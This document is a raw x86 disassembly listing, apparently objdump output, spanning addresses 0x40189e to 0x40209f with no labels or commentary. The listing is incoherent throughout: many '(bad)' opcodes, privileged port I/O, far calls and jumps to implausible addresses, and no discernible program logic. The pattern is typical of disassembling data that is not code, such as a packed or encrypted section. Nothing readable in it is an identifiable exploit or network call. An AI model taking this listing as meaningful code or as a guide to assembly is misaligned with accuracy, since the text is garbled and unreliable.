  40189e:	mov    ecx,DWORD PTR [eax-0x604d5bff]
  4018a4:	retf   0x4dc8
  4018a7:	mov    al,ds:0xaabbffae
  4018ac:	fild   DWORD PTR [ebx+0x36bd69ac]
  4018b2:	xchg   DWORD PTR [ebx],ecx
  4018b4:	in     eax,dx
  4018b5:	dec    eax
  4018b6:	fwait
  4018b7:	push   esi
  4018b8:	(bad)  
  4018b9:	inc    ecx
  4018ba:	int    0xf
  4018bc:	push   esp
  4018bd:	call   0xce23:0x2e291985
  4018c4:	mov    ebp,DWORD PTR [eax-0x7d]
  4018c7:	into   
  4018c8:	adc    bh,ch
  4018ca:	jo     0x401850
  4018cc:	push   0x6ecd9915
  4018d1:	out    0x3d,al
  4018d3:	xchg   edx,eax
  4018d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018d5:	or     ecx,ecx
  4018d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018d8:	xchg   esp,eax
  4018d9:	xchg   BYTE PTR [edi-0x4d],bl
  4018dc:	cmp    BYTE PTR [edi-0x6f],dh
  4018df:	sub    BYTE PTR [edx-0x6a],ah
  4018e2:	out    dx,eax
  4018e3:	jb     0x4018ea
  4018e5:	data16 (bad) 
  4018e7:	ja     0x401943
  4018e9:	clc    
  4018ea:	out    0x30,al
  4018ec:	clc    
  4018ed:	scas   eax,DWORD PTR es:[edi]
  4018ee:	imul   edx,DWORD PTR [edx+edx*2+0x39],0xffffffda
  4018f3:	addr16 cwde 
  4018f5:	out    dx,al
  4018f6:	push   ecx
  4018f7:	enter  0xe971,0x8d
  4018fb:	jmp    0x401978
  4018fd:	enter  0x703c,0xb7
  401901:	es jmp 0x5cc9d863
  401907:	in     al,0x4d
  401909:	and    bh,bl
  40190b:	(bad)  
  40190c:	mul    DWORD PTR [esi-0x7cef8a30]
  401912:	mov    edi,0xc6452512
  401917:	xchg   ebp,eax
  401918:	mul    DWORD PTR [ebx]
  40191a:	les    edx,FWORD PTR [ecx+0x20e5336f]
  401920:	dec    edx
  401921:	and    BYTE PTR [ecx-0x23],ch
  401924:	retf   0xe5de
  401927:	or     ebp,DWORD PTR [ebp+ecx*1-0x32]
  40192b:	(bad)  
  40192c:	nop
  40192d:	test   DWORD PTR [ebx],ebp
  40192f:	fs push ebx
  401931:	daa    
  401932:	inc    ecx
  401933:	mov    esp,0xdd65484
  401938:	fs push ebx
  40193a:	jo     0x401962
  40193c:	fdivr  DWORD PTR [edi+0x62189fa1]
  401942:	mov    ds,WORD PTR [ebp+0x6f]
  401945:	mov    al,0xa0
  401948:	lods   al,BYTE PTR ds:[esi]
  401949:	inc    esp
  40194a:	enter  0x89d6,0x9f
  40194e:	xor    ebp,DWORD PTR [edx-0x9957807]
  401954:	repz push ss
  401956:	in     eax,dx
  401957:	mov    ecx,0x70c6604
  40195c:	hlt    
  40195d:	or     eax,0xf965beee
  401962:	fcmovbe st,st(0)
  401964:	leave  
  401965:	shr    DWORD PTR [eax-0x44],1
  401968:	cs fmul st(0),st
  40196b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40196c:	mov    eax,0x10aa4d31
  401971:	sahf   
  401972:	stc    
  401973:	daa    
  401974:	mov    eax,ds:0x333b16b
  401979:	cs loop 0x40195a
  40197c:	sti    
  40197d:	lods   eax,DWORD PTR ds:[esi]
  40197e:	lods   eax,DWORD PTR ds:[esi]
  40197f:	loop   0x40195a
  401981:	jae    0x4019c2
  401983:	ret    
  401984:	pushf  
  401985:	(bad)  
  401986:	fs cwde 
  401988:	lea    ebx,[esi-0x77f553e3]
  40198e:	pop    eax
  40198f:	or     al,0xba
  401991:	cmp    BYTE PTR [ebp+0x48],al
  401994:	jno    0x401997
  401996:	jle    0x401a03
  401998:	neg    DWORD PTR ds:0x6165f075
  40199e:	ret    
  40199f:	or     BYTE PTR [ebx+0x2d4272e],0xf
  4019a6:	ret    0x69a9
  4019a9:	xchg   edi,eax
  4019aa:	cdq    
  4019ab:	fild   QWORD PTR [edx+0x5e]
  4019ae:	imul   esp,DWORD PTR [edi-0x5],0xb4cf3273
  4019b5:	call   0xf1bfa0d7
  4019ba:	jae    0x40193f
  4019bc:	sbb    ecx,DWORD PTR [edx-0x75f258da]
  4019c2:	cld    
  4019c3:	push   cs
  4019c4:	sub    esi,ebp
  4019c6:	mov    esp,0x3976445f
  4019cb:	mov    ds:0x28529dc8,al
  4019d0:	out    dx,al
  4019d1:	add    al,0x5b
  4019d3:	jbe    0x401993
  4019d5:	and    BYTE PTR [ecx+0x8],bh
  4019d8:	cmp    eax,0xe2302e29
  4019dd:	sti    
  4019de:	and    al,0xe
  4019e0:	mov    dh,BYTE PTR ss:[ebx]
  4019e3:	adc    ch,BYTE PTR [edx+0x75]
  4019e6:	inc    ebx
  4019e7:	pusha  
  4019e8:	dec    eax
  4019e9:	sbb    ebx,DWORD PTR [ecx-0x16]
  4019ec:	xrelease xchg BYTE PTR [ecx+0x6b],cl
  4019f0:	(bad)  
  4019f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019f2:	(bad)  
  4019f3:	(bad)  
  4019f4:	call   0x138:0x70d23747
  4019fb:	(bad)  
  4019fc:	div    ecx
  4019fe:	and    ch,BYTE PTR [edi-0x61]
  401a01:	jo     0x4019a7
  401a03:	in     eax,0xdb
  401a05:	add    al,BYTE PTR [esi-0x7f1e5246]
  401a0b:	mov    ecx,ds
  401a0d:	test   BYTE PTR [ebx+0x77ab4c3f],dl
  401a13:	xchg   BYTE PTR [eax],al
  401a15:	mov    ah,0x2d
  401a17:	adc    bl,BYTE PTR [esi+0x62]
  401a1a:	int    0xb4
  401a1c:	(bad)  
  401a1d:	pop    ss
  401a1e:	dec    edx
  401a1f:	xor    DWORD PTR [ecx],edx
  401a21:	(bad)  
  401a22:	add    eax,0x25297a79
  401a27:	add    al,0x77
  401a29:	es mov dh,0xf2
  401a2c:	push   ss
  401a2d:	pop    ds
  401a2e:	xlat   BYTE PTR ds:[ebx]
  401a2f:	mov    ds:0x73c8bcb,al
  401a34:	and    esi,ebx
  401a36:	sbb    dh,ch
  401a38:	add    eax,0xf75628ae
  401a3d:	or     al,0xe7
  401a3f:	gs repz aad 0xa1
  401a43:	pop    esi
  401a44:	ret    0x1d71
  401a47:	pop    ds
  401a48:	ror    ecx,cl
  401a4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a4b:	ror    dh,cl
  401a4d:	stc    
  401a4e:	jmp    0xc45d289e
  401a53:	or     BYTE PTR [edx+0x36],al
  401a56:	jo     0x401a2a
  401a58:	jno    0x401ac8
  401a5a:	jne    0x401a82
  401a5c:	fs (bad) 
  401a5e:	xor    ebx,DWORD PTR [esi]
  401a60:	sbb    al,0x1c
  401a62:	push   es
  401a63:	pushf  
  401a64:	push   edi
  401a65:	(bad)  
  401a66:	pusha  
  401a67:	cmp    eax,0xee6bd83d
  401a6c:	and    ebp,DWORD PTR [ecx+ebx*4-0x22]
  401a70:	sub    eax,DWORD PTR [edi-0x48ccf57e]
  401a76:	cli    
  401a77:	xchg   esi,eax
  401a78:	sbb    al,0x19
  401a7a:	std    
  401a7b:	ja     0x401a4f
  401a7d:	int    0xf2
  401a7f:	inc    edx
  401a80:	cwde   
  401a81:	cld    
  401a82:	(bad)  
  401a83:	xor    eax,0xcdd4cbe
  401a88:	pop    edi
  401a89:	das    
  401a8a:	mov    ds:0xcb3a7987,al
  401a8f:	fbstp  TBYTE PTR ds:0x3a8d5e93
  401a95:	or     DWORD PTR [esi-0x2d770d79],esp
  401a9b:	pop    ds
  401a9c:	iret   
  401a9d:	fimul  WORD PTR [eax+0x18]
  401aa0:	retf   0xeac5
  401aa3:	sub    ecx,DWORD PTR [esi-0x16]
  401aa6:	ret    0xe781
  401aa9:	mov    cs,esi
  401aab:	inc    ebp
  401aac:	or     eax,0x4005c65b
  401ab1:	jle    0x401af1
  401ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ab4:	sub    edx,DWORD PTR [edi+0x516069ab]
  401aba:	cmp    DWORD PTR [eax],esi
  401abc:	test   DWORD PTR [edi-0x5d],edi
  401abf:	scas   al,BYTE PTR es:[edi]
  401ac0:	pusha  
  401ac1:	retf   0x5b4d
  401ac4:	shl    esi,0x9b
  401ac7:	inc    edi
  401ac8:	jbe    0x401a8e
  401aca:	(bad)  
  401acb:	out    dx,al
  401acc:	not    BYTE PTR [ebx+edi*8+0x7b48169c]
  401ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ad4:	ficomp DWORD PTR [ebp-0x35]
  401ad7:	add    al,0xe5
  401ad9:	jb     0x401a85
  401adb:	inc    edi
  401adc:	imul   eax,DWORD PTR [edi+eiz*8],0x6689ea1d
  401ae3:	xchg   esp,eax
  401ae4:	dec    DWORD PTR [eax+0xc]
  401ae7:	loop   0x401aef
  401ae9:	xchg   edi,eax
  401aea:	sar    DWORD PTR ss:[eax-0x3f],1
  401aee:	or     DWORD PTR [esi],ebp
  401af0:	pushw  cs
  401af2:	js     0x401b4c
  401af4:	sbb    DWORD PTR ds:0x506d5aa3,ecx
  401afa:	idiv   BYTE PTR [edx-0x5cd44ad]
  401b00:	mov    al,ds:0xf7671298
  401b05:	dec    edx
  401b06:	mov    BYTE PTR [eax],0x5b
  401b09:	aaa    
  401b0a:	test   al,al
  401b0c:	jmp    0xf2b7:0x93d03357
  401b13:	jns    0x401b04
  401b15:	mov    eax,ds:0x872e0c82
  401b1a:	ds lock loope 0x401abf
  401b1e:	cs sub eax,0x68b388f2
  401b24:	div    BYTE PTR [esi]
  401b26:	push   es
  401b27:	or     esi,DWORD PTR [ebp-0x62361f01]
  401b2d:	cdq    
  401b2e:	cmp    dh,BYTE PTR [edi-0x2d]
  401b31:	jmp    0x8b97efe9
  401b36:	push   esp
  401b37:	les    edx,FWORD PTR [ecx+0x3347dc5a]
  401b3d:	mov    bl,0x1
  401b3f:	dec    ebp
  401b40:	out    dx,al
  401b41:	jg     0x401b9a
  401b43:	dec    eax
  401b44:	cld    
  401b45:	fdivr  st(0),st
  401b47:	(bad)  
  401b48:	mov    edi,0xeed06e1b
  401b4d:	adc    eax,0x7de12848
  401b52:	xor    DWORD PTR [edx-0x35],esp
  401b55:	div    ch
  401b57:	bound  ebx,QWORD PTR [ecx]
  401b59:	pop    esi
  401b5a:	into   
  401b5b:	xchg   BYTE PTR [ebx+edi*4],dh
  401b5e:	push   ebp
  401b5f:	sbb    BYTE PTR [ecx-0x8cd955a],bl
  401b65:	mov    esi,0x3b3a7d80
  401b6a:	repz jmp 0xe4801308
  401b70:	push   ds
  401b71:	sub    ch,BYTE PTR [ebp-0x40]
  401b74:	retf   0xc0fa
  401b77:	inc    ecx
  401b78:	sub    al,0xc7
  401b7a:	sbb    DWORD PTR [esi-0x2c],ecx
  401b7d:	sbb    ah,BYTE PTR [edx-0x16]
  401b80:	pop    ds
  401b81:	in     al,0xfd
  401b83:	xor    cl,BYTE PTR [ebx+0x17847bb]
  401b89:	test   al,0xff
  401b8b:	dec    esp
  401b8c:	imul   edx,edi,0xffffffae
  401b8f:	mov    cl,0x9f
  401b91:	jmp    0x9b6e50de
  401b96:	and    BYTE PTR [edx+0x74],bl
  401b99:	cmp    BYTE PTR [edx-0x72],bl
  401b9c:	(bad)  
  401b9d:	fs push ebp
  401b9f:	pop    edi
  401ba0:	and    BYTE PTR [edx+eax*1+0x12a5f43],dl
  401ba7:	or     bh,bl
  401ba9:	mov    BYTE PTR [eax+0x2],0xd2
  401bad:	and    al,0xe7
  401baf:	jmp    0xf0cf0613
  401bb4:	dec    eax
  401bb5:	jmp    0x81b4:0xd05ab841
  401bbc:	das    
  401bbd:	push   ebx
  401bbe:	ds jg  0x401be8
  401bc1:	das    
  401bc2:	hlt    
  401bc3:	not    DWORD PTR [ecx-0x2e]
  401bc6:	pop    es
  401bc7:	push   ebx
  401bc8:	jno    0x401bde
  401bca:	stc    
  401bcb:	xchg   edx,eax
  401bcc:	mov    edx,0xe8c87e71
  401bd1:	in     al,0x47
  401bd3:	rol    BYTE PTR [esp+ebp*1-0x13c7f04e],cl
  401bda:	push   esi
  401bdb:	jbe    0x401c49
  401bdd:	xchg   BYTE PTR [edi+0x6a2ae232],ch
  401be3:	aam    0xda
  401be5:	ins    DWORD PTR es:[edi],dx
  401be6:	mov    edx,0x8780f00e
  401beb:	add    ebp,DWORD PTR ds:0xd1ee7bca
  401bf1:	stc    
  401bf2:	fsub   DWORD PTR [eax]
  401bf4:	(bad)  
  401bf5:	pop    eax
  401bf6:	cs fdivp st(5),st
  401bf9:	stos   DWORD PTR es:[edi],eax
  401bfa:	sub    al,0x14
  401bfc:	or     eax,0x304626d5
  401c01:	and    ebp,DWORD PTR [edx-0x2ae699ba]
  401c07:	push   eax
  401c08:	ja     0x401c05
  401c0a:	cmc    
  401c0b:	push   0x8
  401c0d:	mov    ebx,0xc644c477
  401c12:	pop    ebp
  401c13:	adc    BYTE PTR [eax],dh
  401c15:	enter  0x44a8,0x3c
  401c19:	(bad)
  401c1c:	jnp    0x401c84
  401c1e:	xlat   BYTE PTR ds:[ebx]
  401c1f:	push   edx
  401c20:	xor    al,0xd0
  401c22:	xor    cl,BYTE PTR [eax]
  401c24:	cmp    esp,DWORD PTR [ecx+0x69656170]
  401c2a:	pusha  
  401c2b:	pop    esi
  401c2c:	xor    al,0x9b
  401c2e:	pop    esi
  401c2f:	fucompp 
  401c31:	sahf   
  401c32:	xchg   edx,eax
  401c33:	or     al,0x6a
  401c35:	sbb    DWORD PTR [edx],edx
  401c37:	fimul  DWORD PTR [ebp-0x5946c44]
  401c3d:	adc    ebx,DWORD PTR [esi-0x7b]
  401c40:	aaa    
  401c41:	and    al,0xb7
  401c43:	pop    esi
  401c44:	dec    ecx
  401c45:	jmp    0x79928085
  401c4a:	loope  0x401c1a
  401c4c:	frstor [ebx]
  401c4e:	xor    ah,BYTE PTR ds:[edi-0x68672ff8]
  401c55:	cmp    eax,edx
  401c57:	fmul   QWORD PTR [ebx-0x4e09884f]
  401c5d:	ret    
  401c5e:	cmp    edi,ebx
  401c60:	pop    edi
  401c61:	xor    bl,0xfa
  401c64:	sbb    BYTE PTR [eax-0x432b038c],bh
  401c6a:	xor    DWORD PTR [ebp+0x5e],ecx
  401c6d:	shl    BYTE PTR [esi+0x1e],1
  401c70:	scas   eax,DWORD PTR es:[edi]
  401c71:	inc    edi
  401c72:	(bad)  
  401c74:	and    ah,BYTE PTR [edx+0x32]
  401c77:	out    dx,eax
  401c78:	addr16 cs loopne 0x401c17
  401c7c:	pop    esp
  401c7d:	mov    ds:0x839b5cf4,al
  401c82:	adc    dl,BYTE PTR [ecx+0x503f6839]
  401c88:	shr    ebx,cl
  401c8a:	pop    ecx
  401c8b:	lea    ebp,[ebx+0x6e68c0d8]
  401c91:	arpl   WORD PTR [eax],di
  401c93:	sub    eax,0x5917189f
  401c98:	pop    ebx
  401c99:	sbb    BYTE PTR [ecx],0xb6
  401c9c:	call   0x2f49:0xf99ebb01
  401ca3:	cmp    al,0x61
  401ca5:	shr    BYTE PTR [esi+0xd12db65],1
  401cab:	mov    ds:0xf54e7d47,al
  401cb0:	popf   
  401cb1:	mov    ebp,0x8fa7aa4b
  401cb6:	(bad)  
  401cb7:	fidiv  DWORD PTR [esp+ecx*1+0x2d]
  401cbb:	fwait
  401cbc:	jnp    0x401d1e
  401cbe:	jl     0x401caa
  401cc0:	shr    DWORD PTR [ebx],0x1
  401cc3:	cs jmp 0x3bb9ff8b
  401cc9:	retw   0xb84a
  401ccd:	addr16 mov ds:0x6b24,eax
  401cd1:	add    eax,DWORD PTR [edi+edi*2-0x665240b5]
  401cd8:	mov    cl,0xec
  401cda:	mov    ds:0x7f35a1bc,eax
  401cdf:	mov    edx,0xac5e85d2
  401ce4:	mov    cl,0xb8
  401ce6:	into   
  401ce7:	enter  0x9a53,0x42
  401ceb:	js     0x401d1d
  401ced:	in     al,0x58
  401cef:	adc    bh,ch
  401cf1:	cmp    al,0x8f
  401cf3:	jecxz  0x401d37
  401cf5:	dec    ebp
  401cf6:	pop    esi
  401cf7:	ins    DWORD PTR es:[edi],dx
  401cf8:	sbb    al,0x4f
  401cfa:	rol    DWORD PTR [edi],1
  401cfc:	dec    edx
  401cfd:	mov    eax,ds:0x55682407
  401d02:	inc    ecx
  401d03:	ret    
  401d04:	and    DWORD PTR [edx-0x7d],esi
  401d07:	sub    eax,0x7d2d9e2b
  401d0c:	in     al,dx
  401d0d:	mov    ds:0x9c6f2551,eax
  401d12:	pushf  
  401d13:	ror    DWORD PTR [ebx],1
  401d15:	fsubr  DWORD PTR [edi+0x122247e5]
  401d1b:	or     DWORD PTR [ebp+0x7ae4b570],ebx
  401d21:	adc    dh,BYTE PTR [edi+0x547c8d6e]
  401d27:	test   al,0xf5
  401d29:	ins    DWORD PTR es:[edi],dx
  401d2a:	nop
  401d2b:	mov    DWORD PTR [ebp-0x74c9a695],ebx
  401d31:	inc    ebp
  401d32:	popf   
  401d33:	js     0x401d02
  401d35:	lock and eax,0xd08bac0b
  401d3b:	mov    ch,0x72
  401d3d:	stos   BYTE PTR es:[edi],al
  401d3e:	jo     0x401dbd
  401d40:	sub    ebp,DWORD PTR [ecx]
  401d42:	out    dx,al
  401d43:	inc    ch
  401d45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d46:	pop    ebx
  401d47:	sbb    esi,DWORD PTR [ebx+0x420a157f]
  401d4d:	inc    esi
  401d4e:	retf   0xe8b6
  401d51:	inc    ebx
  401d52:	sbb    al,0x28
  401d54:	call   0xdefe:0xf1cf2d5f
  401d5b:	pop    eax
  401d5c:	mov    eax,ds:0x5dc59a2f
  401d61:	push   esp
  401d62:	inc    edx
  401d63:	mov    ss,eax
  401d65:	add    eax,0x3e0a247b
  401d6a:	ins    DWORD PTR es:[edi],dx
  401d6b:	cmp    BYTE PTR [esi-0x6e],dl
  401d6e:	pop    esi
  401d6f:	aad    0x27
  401d71:	add    eax,0x359b2035
  401d76:	je     0x401d05
  401d78:	and    edx,eax
  401d7a:	fwait
  401d7b:	jle    0x401de0
  401d7d:	inc    ebp
  401d7e:	ret    0xd1f6
  401d81:	or     eax,0x1475a1d9
  401d86:	pushf  
  401d87:	cmc    
  401d88:	adc    BYTE PTR [eax+0xc],dl
  401d8b:	xchg   BYTE PTR [ecx],dh
  401d8d:	jp     0x401d4d
  401d8f:	and    BYTE PTR [eax],cl
  401d91:	mov    eax,ds:0x557bc4a9
  401d96:	mov    eax,ds:0x4be5277e
  401d9b:	pop    ss
  401d9c:	xor    DWORD PTR [edx+0x38821535],esi
  401da2:	hlt    
  401da3:	inc    esp
  401da4:	iret   
  401da5:	sbb    al,0xa6
  401da7:	popf   
  401da8:	test   BYTE PTR [ebx],dl
  401daa:	add    eax,0x3db219a8
  401daf:	push   edi
  401db0:	mov    bh,0x9a
  401db2:	xchg   edx,eax
  401db3:	fstp   TBYTE PTR ds:0x1e0baa95
  401db9:	test   BYTE PTR [edi],cl
  401dbb:	gs daa 
  401dbd:	(bad)
  401dc0:	sub    DWORD PTR [edx+0x3c],ebp
  401dc3:	push   es
  401dc4:	cmp    eax,0xc914633b
  401dc9:	ret    0x2351
  401dcc:	mov    ebx,0x2123cff9
  401dd1:	mov    dl,BYTE PTR ds:0x90db461f
  401dd7:	daa    
  401dd8:	aad    0x84
  401dda:	clc    
  401ddb:	push   0xffffffec
  401ddd:	adc    al,0xa6
  401ddf:	xchg   edi,eax
  401de0:	push   esi
  401de1:	inc    esi
  401de2:	ss retf 
  401de4:	xor    bh,BYTE PTR [edx+eiz*1]
  401de7:	xchg   esi,eax
  401de8:	es fwait
  401dea:	xchg   esi,eax
  401deb:	jns    0x401d7d
  401ded:	arpl   WORD PTR [ebx+esi*8],sp
  401df0:	lea    esp,[eax]
  401df2:	test   eax,0x75e715aa
  401df7:	xor    DWORD PTR [ebp+0x2e3eaa85],eax
  401dfd:	mov    ebx,0xcb35c038
  401e02:	sub    eax,0xd582d4e2
  401e07:	in     eax,0x29
  401e09:	add    cl,al
  401e0b:	cmp    al,0x61
  401e0d:	sbb    eax,0xdccd063f
  401e12:	or     edi,DWORD PTR [edx+0x43]
  401e15:	scas   eax,DWORD PTR es:[edi]
  401e16:	outs   dx,BYTE PTR ds:[esi]
  401e17:	adc    BYTE PTR [esi+0x8],ch
  401e1a:	jno    0x401d9c
  401e1c:	pop    edi
  401e1d:	push   ebp
  401e1e:	mov    ds:0xbb1a27bd,eax
  401e23:	xor    DWORD PTR [ebx-0x2be92c6e],ebp
  401e29:	xor    DWORD PTR ds:[esi+0x1a],ecx
  401e2d:	sub    eax,0x30ecfb38
  401e32:	into   
  401e33:	dec    edx
  401e34:	(bad)  
  401e35:	fild   WORD PTR [ebp+0x55]
  401e38:	addr16 xchg edx,eax
  401e3a:	loopne 0x401dbc
  401e3c:	add    al,0xd
  401e3e:	popa   
  401e3f:	cmp    BYTE PTR [edi],bl
  401e41:	(bad)  
  401e42:	push   edi
  401e43:	mov    bl,bl
  401e45:	ja     0x401ec3
  401e47:	sahf   
  401e48:	mov    ds:0x6040f614,eax
  401e4d:	mov    edi,0x959a3d4a
  401e52:	push   0x62526636
  401e57:	sbb    BYTE PTR [edx+ebx*1-0x2d003ec0],ah
  401e5e:	stos   BYTE PTR es:[edi],al
  401e5f:	sub    DWORD PTR [bp+0x26],eax
  401e63:	push   esi
  401e64:	dec    eax
  401e65:	and    al,0x46
  401e67:	jo     0x401ecd
  401e69:	call   DWORD PTR [eax-0x1a7aa5c6]
  401e6f:	and    al,al
  401e71:	fsub   st(3),st
  401e73:	mov    ds:0x97b2643b,eax
  401e78:	test   DWORD PTR [ebp-0x52],ebx
  401e7b:	aad    0xe4
  401e7d:	(bad)  
  401e7e:	stos   BYTE PTR es:[edi],al
  401e7f:	and    eax,0xf5148e4a
  401e84:	sub    al,0x52
  401e86:	sub    ah,BYTE PTR [edi]
  401e88:	das    
  401e89:	pop    ebp
  401e8a:	cmp    eax,0xff622c5a
  401e8f:	or     BYTE PTR [edx+0x20a4c6e5],0x58
  401e96:	stc    
  401e97:	cmp    BYTE PTR [ebp+0x5f],dl
  401e9a:	add    DWORD PTR [esi-0x483f99bd],esi
  401ea0:	adc    BYTE PTR [esi-0x6efe17a0],0xdd
  401ea7:	adc    DWORD PTR [ebp-0x189f912e],esp
  401ead:	jmp    0x401ec4
  401eaf:	push   esp
  401eb0:	clc    
  401eb1:	push   ss
  401eb2:	test   BYTE PTR [ebx-0x5b],dh
  401eb5:	scas   eax,DWORD PTR es:[edi]
  401eb6:	mov    DWORD PTR [edi+0x796de9f],ebp
  401ebc:	adc    eax,0x9f7dfa86
  401ec1:	dec    edi
  401ec2:	add    BYTE PTR [esp+esi*1-0x3e059bca],dh
  401ec9:	je     0x401ef4
  401ecb:	xor    al,0xb4
  401ecd:	bound  esp,QWORD PTR [edi-0x19]
  401ed0:	inc    eax
  401ed1:	jb     0x401f08
  401ed3:	sub    eax,DWORD PTR [edx]
  401ed5:	and    BYTE PTR [ebx],0xcb
  401ed8:	add    BYTE PTR [ebx-0x66],cl
  401edb:	cs pop eax
  401edd:	inc    edx
  401ede:	xor    eax,0x6eb0aade
  401ee3:	or     ecx,DWORD PTR [edi-0x54]
  401ee6:	call   0x8f28:0x32fc3fde
  401eed:	mov    DWORD PTR [edx+edi*1-0x61],esp
  401ef1:	dec    esp
  401ef2:	jns    0x401f61
  401ef4:	mov    gs,esp
  401ef6:	pop    esp
  401ef7:	lahf   
  401ef8:	(bad)  
  401ef9:	push   ss
  401efa:	inc    esi
  401efb:	int    0x32
  401efd:	xchg   ecx,eax
  401efe:	xor    al,0x34
  401f00:	bound  edi,QWORD PTR [edx+ebp*8]
  401f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f04:	cmp    BYTE PTR [edi],dl
  401f06:	xor    eax,DWORD PTR [ebp+0x1d]
  401f09:	inc    eax
  401f0a:	mov    BYTE PTR [ebx+0x2a],cl
  401f0d:	dec    eax
  401f0e:	mov    cl,BYTE PTR [esi-0x63bc1edb]
  401f14:	sub    ch,BYTE PTR [edx+0x6f]
  401f17:	mov    esp,0x52abe1a8
  401f1c:	xor    BYTE PTR [edx+0xf4ac0],cl
  401f22:	ss dec esi
  401f24:	sub    al,0x10
  401f26:	nop
  401f27:	inc    esp
  401f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f29:	inc    esi
  401f2a:	and    bh,BYTE PTR [ecx]
  401f2c:	rcr    BYTE PTR [eax],cl
  401f2e:	clc    
  401f2f:	sbb    DWORD PTR [ecx+0x4e450fa3],edi
  401f35:	push   ds
  401f36:	out    0xdc,eax
  401f38:	xlat   BYTE PTR ds:[ebx]
  401f39:	call   0xdfad104a
  401f3e:	inc    edx
  401f3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f40:	pop    edi
  401f41:	xor    DWORD PTR [esi],edi
  401f43:	sar    DWORD PTR [esi-0x52d0014],1
  401f49:	and    esi,DWORD PTR [edx+0x78d3ff7f]
  401f4f:	ins    BYTE PTR es:[edi],dx
  401f50:	pop    edi
  401f51:	or     edx,DWORD PTR [ebx]
  401f53:	scas   al,BYTE PTR es:[edi]
  401f54:	or     DWORD PTR [ecx-0x740c5b58],ebx
  401f5a:	mov    cl,0x30
  401f5c:	xlat   BYTE PTR ds:[ebx]
  401f5d:	dec    eax
  401f5e:	loope  0x401f8a
  401f60:	xchg   esi,eax
  401f61:	cli    
  401f62:	sbb    ch,cl
  401f64:	sbb    ebp,ebx
  401f66:	adc    al,0x3b
  401f68:	imul   esi,DWORD PTR [ebx+0x32fa898b],0x4a
  401f6f:	inc    eax
  401f70:	sar    BYTE PTR [ecx],1
  401f72:	dec    ebx
  401f73:	adc    cl,BYTE PTR ds:0x31346297
  401f79:	push   ebp
  401f7a:	sub    eax,0xe99dac04
  401f7f:	pop    ecx
  401f80:	add    eax,0x9700ff16
  401f85:	sbb    DWORD PTR [edx-0x3da377f5],ebx
  401f8b:	int    0x20
  401f8d:	imul   eax,eax,0xaa368a2a
  401f93:	dec    edi
  401f94:	xchg   esp,eax
  401f95:	mov    dh,0xee
  401f97:	ret    
  401f98:	inc    edi
  401f99:	cmp    DWORD PTR [esi+0x7e],edx
  401f9c:	pop    ebx
  401f9d:	adc    BYTE PTR [esi-0x4092d008],0x9d
  401fa4:	mov    ebx,0x43be8f07
  401fa9:	or     edi,0xf9132532
  401faf:	ins    DWORD PTR es:[edi],dx
  401fb0:	sbb    dl,al
  401fb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fb3:	retf   0x1a68
  401fb6:	out    dx,al
  401fb7:	mov    esi,0x85ecdd4e
  401fbc:	rcl    DWORD PTR [eax],1
  401fbe:	and    al,ch
  401fc0:	mov    ds:0xc7684c1,eax
  401fc5:	loope  0x401fa2
  401fc7:	mov    edx,0x71bb8628
  401fcc:	sbb    ah,0x1c
  401fcf:	jg     0x401f78
  401fd1:	and    cl,bl
  401fd3:	cmp    DWORD PTR [eax-0x20e3a34e],ebp
  401fd9:	test   al,0xa5
  401fdb:	xlat   BYTE PTR ds:[ebx]
  401fdc:	(bad)  
  401fdd:	test   al,0xa1
  401fdf:	push   0x93b7f7f8
  401fe4:	mov    ecx,0xb6b4c429
  401fe9:	mov    DWORD PTR [eax+0x6ddb59e7],ebx
  401fef:	mov    eax,0xb3b323
  401ff4:	or     BYTE PTR [ecx],dh
  401ff6:	lahf   
  401ff7:	(bad)  
  401ff8:	dec    edi
  401ff9:	fidivr DWORD PTR [eax+0x4f6f55d5]
  401fff:	mov    ebp,0x8ddd9d23
  402004:	iret   
  402005:	sahf   
  402006:	adc    eax,0xb81cd81c
  40200b:	outs   dx,DWORD PTR ds:[esi]
  40200c:	add    eax,0x208771ae
  402011:	ret    0xccf9
  402014:	cs cli 
  402016:	mov    bh,BYTE PTR [edx]
  402018:	xor    eax,0x88012daa
  40201d:	inc    esp
  40201e:	xor    bp,WORD PTR [esi-0x14]
  402022:	pop    ebx
  402023:	lea    ecx,[edi+0x5ad98e12]
  402029:	push   es
  40202a:	test   eax,0x87d1a287
  40202f:	mov    al,ds:0xc5bb7437
  402034:	mov    WORD PTR [eax+0xedfdec8],es
  40203a:	inc    eax
  40203b:	fdiv   QWORD PTR [ecx]
  40203d:	nop
  40203e:	sbb    ch,BYTE PTR [ebx-0x15ab53d5]
  402044:	xor    ch,BYTE PTR [ebx-0x15]
  402047:	and    al,al
  402049:	jmp    0xbd12:0x80d5c008
  402050:	jnp    0x402070
  402052:	stos   DWORD PTR es:[edi],eax
  402053:	mov    ebp,0x62455eb3
  402058:	mov    cs,WORD PTR [eax+0x25]
  40205b:	cmp    eax,0xaabd19c9
  402060:	sti    
  402061:	(bad)  
  402063:	fisub  DWORD PTR [edx-0x5a4f75e5]
  402069:	and    eax,0x78f3d504
  40206e:	lds    ebx,FWORD PTR [eax-0x48]
  402071:	inc    ebx
  402072:	das    
  402073:	popf   
  402074:	retf   
  402075:	dec    ecx
  402076:	mov    ds:0xb43391b6,al
  40207b:	ss pop esp
  40207d:	sub    BYTE PTR [ecx],al
  40207f:	gs inc eax
  402081:	mov    bh,0x3f
  402083:	mov    dh,0x9d
  402085:	push   edx
  402086:	mov    esi,0xa1c2f63d
  40208b:	jge    0x402064
  40208d:	jle    0x402058
  40208f:	imul   DWORD PTR [ebp+eax*1+0x32]
  402093:	xchg   edi,eax
  402094:	mov    bh,BYTE PTR [ecx]
  402096:	xor    al,0xae
  402098:	cmp    ebx,DWORD PTR [ecx+ebp*8+0x66]
  40209c:	inc    edi
  40209d:	sbb    al,0xd4
  40209f:	in     eax,0x3
